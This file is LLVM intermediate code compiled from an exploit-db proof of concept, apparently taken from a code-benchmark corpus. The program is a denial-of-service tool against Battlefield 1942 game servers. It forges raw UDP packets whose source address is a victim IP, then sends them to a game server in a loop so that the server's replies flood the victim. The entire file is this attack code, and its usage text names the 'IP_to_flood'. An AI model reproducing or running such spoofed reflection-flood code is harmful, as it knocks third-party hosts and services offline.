; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_22183.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_22183.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.pseudohdr = type { i8*, i8*, i64, i8*, i8* }
%struct.sockaddr_in = type { i32, i8*, %struct.TYPE_2__ }
%struct.TYPE_2__ = type { i8* }
%struct.iphdr = type { i32, i32, i32, i32, i32, i8*, i8*, i64, i8*, i64, i32 }
%struct.udphdr = type { i64, i8*, i8*, i8* }
%struct.sockaddr = type { i32 }

@BUFFSZ = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [56 x i8] c"\0D\0A---------------------------------------------------\0D\0A\00", align 1
@.str.1 = private unnamed_addr constant [45 x i8] c"      Game Server DoS  -  Proof-of-Concept\0D\0A\00", align 1
@.str.2 = private unnamed_addr constant [50 x i8] c"   by Mike Kristovich, PivX Security Researcher\0D\0A\00", align 1
@.str.3 = private unnamed_addr constant [54 x i8] c"= http://www.PivX.com :    : mkristovich@pivx.com =\0D\0A\00", align 1
@.str.4 = private unnamed_addr constant [54 x i8] c"---------------------------------------------------\0D\0A\00", align 1
@.str.5 = private unnamed_addr constant [54 x i8] c"= Advisory MK#001 :        : Battlefield 1942 DoS =\0D\0A\00", align 1
@stdout = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [64 x i8] c"Usage: %s <IP_to_flood> <Server_IP> <kBps_to_use> <#_packets>\0D\0A\00", align 1
@.str.7 = private unnamed_addr constant [71 x i8] c":: Options :: <victim_port[default 53]> <server_port[default 23000]>\0D\0A\00", align 1
@DSTPORT = common dso_local global i32 0, align 4
@SRCPORT = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [30 x i8] c"Sending packets to server ...\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@IPSZ = common dso_local global i32 0, align 4
@UDPSZ = common dso_local global i32 0, align 4
@pseudohdr = common dso_local global %struct.pseudohdr* null, align 8
@STRING = common dso_local global i32* null, align 8
@DATASZ = common dso_local global i32 0, align 4
@SIZE = common dso_local global i32 0, align 4
@IPPROTO_UDP = common dso_local global i8* null, align 8
@PSEUDOSZ = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@IPPROTO_RAW = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [53 x i8] c"\0D\0ASpoofed packets sent to Battlefield 1942 server.\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  %9 = alloca i32*, align 8
  %10 = alloca %struct.sockaddr_in, align 8
  %11 = alloca %struct.iphdr*, align 8
  %12 = alloca %struct.udphdr*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %23 = load i32, i32* @BUFFSZ, align 4
  %24 = zext i32 %23 to i64
  %25 = call i8* @llvm.stacksave()
  store i8* %25, i8** %6, align 8
  %26 = alloca i32, i64 %24, align 16
  store i64 %24, i64* %7, align 8
  %27 = load i32, i32* @BUFFSZ, align 4
  %28 = zext i32 %27 to i64
  %29 = alloca i32, i64 %28, align 16
  store i64 %28, i64* %8, align 8
  %30 = call i32 @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str, i64 0, i64 0))
  %31 = call i32 @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.1, i64 0, i64 0))
  %32 = call i32 @printf(i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.2, i64 0, i64 0))
  %33 = call i32 @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.3, i64 0, i64 0))
  %34 = call i32 @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.4, i64 0, i64 0))
  %35 = call i32 @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.5, i64 0, i64 0))
  %36 = call i32 @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.4, i64 0, i64 0))
  %37 = load i32, i32* @stdout, align 4
  %38 = call i32 @setbuf(i32 %37, i32* null)
  %39 = load i32, i32* %4, align 4
  %40 = icmp slt i32 %39, 4
  br i1 %40, label %41, label %48

41:                                               ; preds = %2
  %42 = load i32, i32* @stderr, align 4
  %43 = load i8**, i8*** %5, align 8
  %44 = load i8*, i8** %43, align 8
  %45 = call i32 @fprintf(i32 %42, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.6, i64 0, i64 0), i8* %44)
  %46 = call i32 @printf(i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.7, i64 0, i64 0))
  %47 = call i32 @exit(i32 1) #4
  unreachable

48:                                               ; preds = %2
  %49 = load i8**, i8*** %5, align 8
  %50 = getelementptr inbounds i8*, i8** %49, i64 1
  %51 = load i8*, i8** %50, align 8
  %52 = call i8* @resolv(i8* %51)
  store i8* %52, i8** %15, align 8
  %53 = load i8**, i8*** %5, align 8
  %54 = getelementptr inbounds i8*, i8** %53, i64 2
  %55 = load i8*, i8** %54, align 8
  %56 = call i8* @resolv(i8* %55)
  store i8* %56, i8** %16, align 8
  %57 = load i8**, i8*** %5, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 6
  %59 = load i8*, i8** %58, align 8
  %60 = icmp ne i8* %59, null
  br i1 %60, label %63, label %61

61:                                               ; preds = %48
  %62 = load i32, i32* @DSTPORT, align 4
  store i32 %62, i32* %18, align 4
  br label %68

63:                                               ; preds = %48
  %64 = load i8**, i8*** %5, align 8
  %65 = getelementptr inbounds i8*, i8** %64, i64 6
  %66 = load i8*, i8** %65, align 8
  %67 = call i32 @atoi(i8* %66)
  store i32 %67, i32* %18, align 4
  br label %68

68:                                               ; preds = %63, %61
  %69 = load i8**, i8*** %5, align 8
  %70 = getelementptr inbounds i8*, i8** %69, i64 5
  %71 = load i8*, i8** %70, align 8
  %72 = icmp ne i8* %71, null
  br i1 %72, label %75, label %73

73:                                               ; preds = %68
  %74 = load i32, i32* @SRCPORT, align 4
  store i32 %74, i32* %17, align 4
  br label %80

75:                                               ; preds = %68
  %76 = load i8**, i8*** %5, align 8
  %77 = getelementptr inbounds i8*, i8** %76, i64 5
  %78 = load i8*, i8** %77, align 8
  %79 = call i32 @atoi(i8* %78)
  store i32 %79, i32* %17, align 4
  br label %80

80:                                               ; preds = %75, %73
  %81 = call i32 @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.8, i64 0, i64 0))
  %82 = load i8*, i8** %16, align 8
  %83 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %84 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %83, i32 0, i32 0
  store i8* %82, i8** %84, align 8
  %85 = load i32, i32* %18, align 4
  %86 = call i8* @htons(i32 %85)
  %87 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i8* %86, i8** %87, align 8
  %88 = load i32, i32* @AF_INET, align 4
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i32 %88, i32* %89, align 8
  %90 = bitcast i32* %26 to %struct.iphdr*
  store %struct.iphdr* %90, %struct.iphdr** %11, align 8
  %91 = load i32, i32* @IPSZ, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds i32, i32* %26, i64 %92
  %94 = bitcast i32* %93 to %struct.udphdr*
  store %struct.udphdr* %94, %struct.udphdr** %12, align 8
  %95 = load i32, i32* @IPSZ, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds i32, i32* %26, i64 %96
  %98 = load i32, i32* @UDPSZ, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds i32, i32* %97, i64 %99
  store i32* %100, i32** %9, align 8
  %101 = bitcast i32* %29 to %struct.pseudohdr*
  store %struct.pseudohdr* %101, %struct.pseudohdr** @pseudohdr, align 8
  %102 = load i32*, i32** %9, align 8
  %103 = load i32*, i32** @STRING, align 8
  %104 = load i32, i32* @DATASZ, align 4
  %105 = call i32 @memcpy(i32* %102, i32* %103, i32 %104)
  %106 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %107 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %106, i32 0, i32 0
  store i32 5, i32* %107, align 8
  %108 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %109 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %108, i32 0, i32 1
  store i32 4, i32* %109, align 4
  %110 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %111 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %110, i32 0, i32 2
  store i32 8, i32* %111, align 8
  %112 = load i32, i32* @SIZE, align 4
  %113 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i32 0, i32 10
  store i32 %112, i32* %114, align 8
  %115 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %116 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %115, i32 0, i32 3
  store i32 156, i32* %116, align 4
  %117 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %118 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %117, i32 0, i32 9
  store i64 0, i64* %118, align 8
  %119 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %120 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %119, i32 0, i32 4
  store i32 128, i32* %120, align 8
  %121 = load i8*, i8** @IPPROTO_UDP, align 8
  %122 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %123 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %122, i32 0, i32 8
  store i8* %121, i8** %123, align 8
  %124 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %125 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %124, i32 0, i32 7
  store i64 0, i64* %125, align 8
  %126 = load i8*, i8** %15, align 8
  %127 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %128 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %127, i32 0, i32 6
  store i8* %126, i8** %128, align 8
  %129 = load i8*, i8** %16, align 8
  %130 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %131 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %130, i32 0, i32 5
  store i8* %129, i8** %131, align 8
  %132 = load i32, i32* %17, align 4
  %133 = call i8* @htons(i32 %132)
  %134 = load %struct.udphdr*, %struct.udphdr** %12, align 8
  %135 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %134, i32 0, i32 3
  store i8* %133, i8** %135, align 8
  %136 = load i32, i32* %18, align 4
  %137 = call i8* @htons(i32 %136)
  %138 = load %struct.udphdr*, %struct.udphdr** %12, align 8
  %139 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %138, i32 0, i32 2
  store i8* %137, i8** %139, align 8
  %140 = load %struct.udphdr*, %struct.udphdr** %12, align 8
  %141 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %140, i32 0, i32 0
  store i64 0, i64* %141, align 8
  %142 = load i32, i32* @UDPSZ, align 4
  %143 = load i32, i32* @DATASZ, align 4
  %144 = add nsw i32 %142, %143
  %145 = call i8* @htons(i32 %144)
  %146 = load %struct.udphdr*, %struct.udphdr** %12, align 8
  %147 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %146, i32 0, i32 1
  store i8* %145, i8** %147, align 8
  %148 = load i32, i32* @PSEUDOSZ, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds i32, i32* %29, i64 %149
  %151 = load i32, i32* @IPSZ, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds i32, i32* %26, i64 %152
  %154 = load i32, i32* @UDPSZ, align 4
  %155 = load i32, i32* @DATASZ, align 4
  %156 = add nsw i32 %154, %155
  %157 = call i32 @memcpy(i32* %150, i32* %153, i32 %156)
  %158 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i32 0, i32 6
  %160 = load i8*, i8** %159, align 8
  %161 = load %struct.pseudohdr*, %struct.pseudohdr** @pseudohdr, align 8
  %162 = getelementptr inbounds %struct.pseudohdr, %struct.pseudohdr* %161, i32 0, i32 4
  store i8* %160, i8** %162, align 8
  %163 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 5
  %165 = load i8*, i8** %164, align 8
  %166 = load %struct.pseudohdr*, %struct.pseudohdr** @pseudohdr, align 8
  %167 = getelementptr inbounds %struct.pseudohdr, %struct.pseudohdr* %166, i32 0, i32 3
  store i8* %165, i8** %167, align 8
  %168 = load %struct.pseudohdr*, %struct.pseudohdr** @pseudohdr, align 8
  %169 = getelementptr inbounds %struct.pseudohdr, %struct.pseudohdr* %168, i32 0, i32 2
  store i64 0, i64* %169, align 8
  %170 = load i8*, i8** @IPPROTO_UDP, align 8
  %171 = load %struct.pseudohdr*, %struct.pseudohdr** @pseudohdr, align 8
  %172 = getelementptr inbounds %struct.pseudohdr, %struct.pseudohdr* %171, i32 0, i32 1
  store i8* %170, i8** %172, align 8
  %173 = load %struct.udphdr*, %struct.udphdr** %12, align 8
  %174 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %173, i32 0, i32 1
  %175 = load i8*, i8** %174, align 8
  %176 = load %struct.pseudohdr*, %struct.pseudohdr** @pseudohdr, align 8
  %177 = getelementptr inbounds %struct.pseudohdr, %struct.pseudohdr* %176, i32 0, i32 0
  store i8* %175, i8** %177, align 8
  %178 = load i32, i32* @PSEUDOSZ, align 4
  %179 = load i32, i32* @UDPSZ, align 4
  %180 = add nsw i32 %178, %179
  %181 = load i32, i32* @DATASZ, align 4
  %182 = add nsw i32 %180, %181
  %183 = call i64 @in_cksum(i32* %29, i32 %182)
  %184 = load %struct.udphdr*, %struct.udphdr** %12, align 8
  %185 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %184, i32 0, i32 0
  store i64 %183, i64* %185, align 8
  %186 = load i32, i32* @AF_INET, align 4
  %187 = load i32, i32* @SOCK_RAW, align 4
  %188 = load i32, i32* @IPPROTO_RAW, align 4
  %189 = call i32 @socket(i32 %186, i32 %187, i32 %188)
  store i32 %189, i32* %13, align 4
  %190 = load i32, i32* %13, align 4
  %191 = icmp slt i32 %190, 0
  br i1 %191, label %192, label %194

192:                                              ; preds = %80
  %193 = call i32 (...) @std_err()
  br label %194

194:                                              ; preds = %192, %80
  %195 = load i8**, i8*** %5, align 8
  %196 = getelementptr inbounds i8*, i8** %195, i64 4
  %197 = load i8*, i8** %196, align 8
  %198 = call i32 @atoi(i8* %197)
  store i32 %198, i32* %20, align 4
  %199 = load i8**, i8*** %5, align 8
  %200 = getelementptr inbounds i8*, i8** %199, i64 3
  %201 = load i8*, i8** %200, align 8
  %202 = call i32 @atoi(i8* %201)
  store i32 %202, i32* %22, align 4
  store i32 0, i32* %19, align 4
  br label %203

203:                                              ; preds = %229, %194
  %204 = load i32, i32* %19, align 4
  %205 = load i32, i32* %20, align 4
  %206 = icmp slt i32 %204, %205
  br i1 %206, label %207, label %232

207:                                              ; preds = %203
  store i32 0, i32* %21, align 4
  br label %208

208:                                              ; preds = %224, %207
  %209 = load i32, i32* %21, align 4
  %210 = load i32, i32* %22, align 4
  %211 = icmp slt i32 %209, %210
  br i1 %211, label %212, label %227

212:                                              ; preds = %208
  %213 = load i32, i32* %13, align 4
  %214 = load i32, i32* @SIZE, align 4
  %215 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %216 = call i32 @sendto(i32 %213, i32* %26, i32 %214, i32 0, %struct.sockaddr* %215, i32 24)
  store i32 %216, i32* %14, align 4
  %217 = load i32, i32* %14, align 4
  %218 = icmp slt i32 %217, 0
  br i1 %218, label %219, label %221

219:                                              ; preds = %212
  %220 = call i32 (...) @std_err()
  br label %221

221:                                              ; preds = %219, %212
  %222 = load i32, i32* %19, align 4
  %223 = add nsw i32 %222, 1
  store i32 %223, i32* %19, align 4
  br label %224

224:                                              ; preds = %221
  %225 = load i32, i32* %21, align 4
  %226 = add nsw i32 %225, 1
  store i32 %226, i32* %21, align 4
  br label %208

227:                                              ; preds = %208
  %228 = call i32 @usleep(i32 24000)
  br label %229

229:                                              ; preds = %227
  %230 = load i32, i32* %19, align 4
  %231 = add nsw i32 %230, 1
  store i32 %231, i32* %19, align 4
  br label %203

232:                                              ; preds = %203
  %233 = call i32 @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.9, i64 0, i64 0))
  %234 = load i32, i32* %13, align 4
  %235 = call i32 @close(i32 %234)
  store i32 0, i32* %3, align 4
  %236 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %236)
  %237 = load i32, i32* %3, align 4
  ret i32 %237
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*) #2

declare dso_local i32 @setbuf(i32, i32*) #2

declare dso_local i32 @fprintf(i32, i8*, i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i8* @resolv(i8*) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i8* @htons(i32) #2

declare dso_local i32 @memcpy(i32*, i32*, i32) #2

declare dso_local i64 @in_cksum(i32*, i32) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @std_err(...) #2

declare dso_local i32 @sendto(i32, i32*, i32, i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @usleep(i32) #2

declare dso_local i32 @close(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
